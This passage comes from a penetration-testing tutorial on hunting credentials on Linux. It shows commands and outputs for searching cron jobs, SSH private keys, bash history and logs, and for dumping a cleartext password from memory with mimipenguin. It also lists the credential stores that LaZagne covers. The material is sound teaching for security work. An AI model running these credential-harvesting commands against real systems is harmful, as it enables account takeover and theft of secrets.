class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;doc&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\|&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;lib&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\|&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\|&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;share&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;
File extension:  .py

File extension:  .pyc

File extension:  .pl

File extension:  .go

File extension:  .jar

File extension:  .c

File extension:  .sh
/snap/gnome-3-34-1804/72/etc/profile.d/vte-2.91.sh
/snap/gnome-3-34-1804/72/usr/bin/gettext.sh
/snap/core18/2128/etc/init.d/hwclock.sh
/snap/core18/2128/etc/wpa_supplicant/action_wpa.sh
/snap/core18/2128/etc/wpa_supplicant/functions.sh
...SNIP...
/etc/profile.d/xdg_dirs_desktop_session.sh
/etc/profile.d/cedilla-portuguese.sh
/etc/profile.d/im-config_wayland.sh
/etc/profile.d/vte-2.91.sh
/etc/profile.d/bash_completion.sh
/etc/profile.d/apps-bin-path.sh
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Cronjobs are independent execution of commands, programs, scripts. These are divided into the system-wide area (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/crontab&lt;/code&gt;) and user-dependent executions. Some applications and scripts require credentials to run and are therefore incorrectly entered in the cronjobs. Furthermore, there are the areas that are divided into different time ranges (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/cron.daily&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/cron.hourly&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/cron.monthly&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/cron.weekly&lt;/code&gt;). The scripts and files used by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cron&lt;/code&gt; can also be found in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/cron.d/&lt;/code&gt; for Debian-based distributions.&lt;/p&gt;

&lt;h4 id=&quot;cronjobs&quot;&gt;Cronjobs&lt;/h4&gt;

&lt;p&gt;Credential Hunting in Linux&lt;/p&gt;

&lt;div class=&quot;language-shell-session highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;cry0l1t3@unixclient:~$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/crontab 
&lt;span class=&quot;go&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;/etc/crontab: system-wide crontab
&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;Unlike any other crontab you don&lt;span class=&quot;s1&quot;&gt;&apos;t have to run the `crontab&apos;&lt;/span&gt;
&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;to &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;the new version when you edit this file
&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;and files &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; /etc/cron.d. These files also have username fields,
&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;that none of the other crontabs &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;Example of job definition:
&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;.---------------- minute &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0 - 59&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;|  .------------- hour &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0 - 23&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;|  |  .---------- day of month &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 - 31&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;|  |  |  .------- month &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 - 12&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; OR jan,feb,mar,apr ...
&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;|  |  |  |  .---- day of week &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0 - 6&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;Sunday&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0 or 7&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; OR sun,mon,tue,wed,thu,fri,sat
&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;|  |  |  |  |
&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; user-name &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;to be executed
&lt;span class=&quot;go&quot;&gt;17 *    * * *   root    cd / &amp;amp;&amp;amp; run-parts --report /etc/cron.hourly
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Credential Hunting in Linux&lt;/p&gt;

&lt;div class=&quot;language-shell-session highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;cry0l1t3@unixclient:~$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt; /etc/cron.&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/
&lt;span class=&quot;go&quot;&gt;
/etc/cron.d/:
total 28
drwxr-xr-x 1 root root  106  3. Jan 20:27 .
drwxr-xr-x 1 root root 5728  1. Feb 00:06 ..
-rw-r--r-- 1 root root  201  1. Mär 2021  e2scrub_all
-rw-r--r-- 1 root root  331  9. Jan 2021  geoipupdate
-rw-r--r-- 1 root root  607 25. Jan 2021  john
-rw-r--r-- 1 root root  589 14. Sep 2020  mdadm
-rw-r--r-- 1 root root  712 11. Mai 2020  php
-rw-r--r-- 1 root root  102 22. Feb 2021  .placeholder
-rw-r--r-- 1 root root  396  2. Feb 2021  sysstat

/etc/cron.daily/:
total 68
drwxr-xr-x 1 root root  252  6. Jan 16:24 .
drwxr-xr-x 1 root root 5728  1. Feb 00:06 ..
...SNIP...
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;ssh-keys&quot;&gt;SSH Keys&lt;/h4&gt;

&lt;p&gt;SSH keys can be considered “access cards” for the SSH protocol used for the public key authentication mechanism. A file is generated for the client (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Private key&lt;/code&gt;) and a corresponding one for the server (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Public key&lt;/code&gt;). However, these are not the same, so knowing the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;public key&lt;/code&gt; is insufficient to find a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;private key&lt;/code&gt;. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;public key&lt;/code&gt; can verify signatures generated by the private SSH key and thus enables automatic login to the server. Even if unauthorized persons get hold of the public key, it is almost impossible to calculate the matching private one from it. When connecting to the server using the private SSH key, the server checks whether the private key is valid and lets the client log in accordingly. Thus, passwords are no longer needed to connect via SSH.&lt;/p&gt;

&lt;p&gt;Since the SSH keys can be named arbitrarily, we cannot search them for specific names. However, their format allows us to identify them uniquely because, whether public key or private key, both have unique first lines to distinguish them.&lt;/p&gt;

&lt;h4 id=&quot;ssh-private-keys&quot;&gt;SSH Private Keys&lt;/h4&gt;

&lt;p&gt;Credential Hunting in Linux&lt;/p&gt;

&lt;div class=&quot;language-shell-session highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;cry0l1t3@unixclient:~$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-rnw&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;PRIVATE KEY&quot;&lt;/span&gt; /home/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; 2&amp;gt;/dev/null | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;:1&quot;&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;
/home/cry0l1t3/.ssh/internal_db:1:-----BEGIN OPENSSH PRIVATE KEY-----
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;ssh-public-keys&quot;&gt;SSH Public Keys&lt;/h4&gt;

&lt;p&gt;Credential Hunting in Linux&lt;/p&gt;

&lt;div class=&quot;language-shell-session highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;cry0l1t3@unixclient:~$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-rnw&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;ssh-rsa&quot;&lt;/span&gt; /home/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; 2&amp;gt;/dev/null | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;:1&quot;&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;
/home/cry0l1t3/.ssh/internal_db.pub:1:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCraK
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;history&quot;&gt;History&lt;/h2&gt;

&lt;p&gt;All history files provide crucial information about the current and past/historical course of processes. We are interested in the files that store users’ command history and the logs that store information about system processes.&lt;/p&gt;

&lt;p&gt;In the history of the commands entered on Linux distributions that use Bash as a standard shell, we find the associated files in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.bash_history&lt;/code&gt;. Nevertheless, other files like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.bashrc&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.bash_profile&lt;/code&gt; can contain important information.&lt;/p&gt;

&lt;h4 id=&quot;bash-history&quot;&gt;Bash History&lt;/h4&gt;

&lt;p&gt;Credential Hunting in Linux&lt;/p&gt;

&lt;div class=&quot;language-shell-session highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;cry0l1t3@unixclient:~$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;tail&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n5&lt;/span&gt; /home/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/.bash&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;==&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;/home/cry0l1t3/.bash_history &amp;lt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;vim ~/testing.txt
vim ~/testing.txt
chmod 755 /tmp/api.py
su
/tmp/api.py cry0l1t3 6mX4UP1eWH3HXK

&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;==&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;/home/cry0l1t3/.bashrc &amp;lt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;    . /usr/share/bash-completion/bash_completion
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;  elif [ -f /etc/bash_completion ];&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;then&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;    . /etc/bash_completion
  fi
fi
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;logs&quot;&gt;Logs&lt;/h4&gt;

&lt;p&gt;An essential concept of Linux systems is log files that are stored in text files. Many programs, especially all services and the system itself, write such files. In them, we find system errors, detect problems regarding services or follow what the system is doing in the background. The entirety of log files can be divided into four categories:&lt;/p&gt;

&lt;p&gt;|&lt;strong&gt;Application Logs&lt;/strong&gt;|&lt;strong&gt;Event Logs&lt;/strong&gt;|&lt;strong&gt;Service Logs&lt;/strong&gt;|&lt;strong&gt;System Logs&lt;/strong&gt;|
|—|—|—|—|&lt;/p&gt;

&lt;p&gt;Many different logs exist on the system. These can vary depending on the applications installed, but here are some of the most important ones:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;&lt;strong&gt;Log File&lt;/strong&gt;&lt;/th&gt;
      &lt;th&gt;&lt;strong&gt;Description&lt;/strong&gt;&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/log/messages&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Generic system activity logs.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/log/syslog&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Generic system activity logs.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/log/auth.log&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;(Debian) All authentication related logs.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/log/secure&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;(RedHat/CentOS) All authentication related logs.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/log/boot.log&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Booting information.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/log/dmesg&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Hardware and drivers related information and logs.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/log/kern.log&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Kernel related warnings, errors and logs.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/log/faillog&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Failed login attempts.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/log/cron&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Information related to cron jobs.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/log/mail.log&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;All mail server related logs.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/log/httpd&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;All Apache related logs.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/log/mysqld.log&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;All MySQL server related logs.&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Covering the analysis of these log files in detail would be inefficient in this case. So at this point, we should familiarize ourselves with the individual logs, first examining them manually and understanding their formats. However, here are some strings we can use to find interesting content in the logs:&lt;/p&gt;

&lt;p&gt;Credential Hunting in Linux&lt;/p&gt;

&lt;div class=&quot;language-shell-session highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;cry0l1t3@unixclient:~$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;i &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; /var/log/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; 2&amp;gt;/dev/null&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;GREP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;accepted&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\|&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;session opened&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\|&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;session closed&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\|&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;failure&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\|&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;failed&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\|&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ssh&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\|&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;password changed&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\|&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;new user&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\|&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;delete user&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\|&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;sudo&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\|&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;COMMAND&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\=\|&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;logs&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt; 2&amp;gt;/dev/null&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[[&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$GREP&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;then &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;#### Log file: &quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;accepted&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\|&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;session opened&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\|&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;session closed&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\|&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;failure&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\|&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;failed&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\|&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ssh&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\|&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;password changed&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\|&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;new user&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\|&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;delete user&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\|&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;sudo&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\|&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;COMMAND&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\=\|&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;logs&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt; 2&amp;gt;/dev/null&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;fi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;### Log file:  /var/log/dpkg.log.1&lt;/span&gt;
&lt;span class=&quot;gp&quot;&gt;2022-01-10 17:57:41 install libssh-dev:amd64 &amp;lt;none&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;0.9.5-1+deb11u1
&lt;span class=&quot;go&quot;&gt;2022-01-10 17:57:41 status half-installed libssh-dev:amd64 0.9.5-1+deb11u1
2022-01-10 17:57:41 status unpacked libssh-dev:amd64 0.9.5-1+deb11u1 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;2022-01-10 17:57:41 configure libssh-dev:amd64 0.9.5-1+deb11u1 &amp;lt;none&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; 
&lt;/span&gt;&lt;span class=&quot;go&quot;&gt;2022-01-10 17:57:41 status unpacked libssh-dev:amd64 0.9.5-1+deb11u1 
2022-01-10 17:57:41 status half-configured libssh-dev:amd64 0.9.5-1+deb11u1
2022-01-10 17:57:41 status installed libssh-dev:amd64 0.9.5-1+deb11u1

...SNIP...
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;memory-and-cache&quot;&gt;Memory and Cache&lt;/h2&gt;

&lt;p&gt;Many applications and processes work with credentials needed for authentication and store them either in memory or in files so that they can be reused. For example, it may be the system-required credentials for the logged-in users. Another example is the credentials stored in the browsers, which can also be read. In order to retrieve this type of information from Linux distributions, there is a tool called &lt;a href=&quot;https://github.com/huntergregal/mimipenguin&quot;&gt;mimipenguin&lt;/a&gt; that makes the whole process easier. However, this tool requires administrator/root permissions.&lt;/p&gt;

&lt;h4 id=&quot;memory---mimipenguin&quot;&gt;Memory - Mimipenguin&lt;/h4&gt;

&lt;p&gt;Credential Hunting in Linux&lt;/p&gt;

&lt;div class=&quot;language-shell-session highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;cry0l1t3@unixclient:~$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;python3 mimipenguin.py
&lt;span class=&quot;go&quot;&gt;[sudo] password for cry0l1t3: 

[SYSTEM - GNOME]	cry0l1t3:WLpAEXFa0SbqOHY


&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;cry0l1t3@unixclient:~$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;bash mimipenguin.sh 
&lt;span class=&quot;go&quot;&gt;[sudo] password for cry0l1t3: 

MimiPenguin Results:
[SYSTEM - GNOME]          cry0l1t3:WLpAEXFa0SbqOHY
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;An even more powerful tool we can use that was mentioned earlier in the Credential Hunting in Windows section is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LaZagne&lt;/code&gt;. This tool allows us to access far more resources and extract the credentials. The passwords and hashes we can obtain come from the following sources but are not limited to:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt; &lt;/th&gt;
      &lt;th&gt; &lt;/th&gt;
      &lt;th&gt; &lt;/th&gt;
      &lt;th&gt; &lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;Wifi&lt;/td&gt;
      &lt;td&gt;Wpa_supplicant&lt;/td&gt;
      &lt;td&gt;Libsecret&lt;/td&gt;
      &lt;td&gt;Kwallet&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Chromium-based&lt;/td&gt;
      &lt;td&gt;CLI&lt;/td&gt;
      &lt;td&gt;Mozilla&lt;/td&gt;
      &lt;td&gt;Thunderbird&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Git&lt;/td&gt;
      &lt;td&gt;Env_variable&lt;/td&gt;
      &lt;td&gt;Grub&lt;/td&gt;
      &lt;td&gt;Fstab&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;AWS&lt;/td&gt;
      &lt;td&gt;Filezilla&lt;/td&gt;
      &lt;td&gt;Gftp&lt;/td&gt;
      &lt;td&gt;SSH&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Apache&lt;/td&gt;
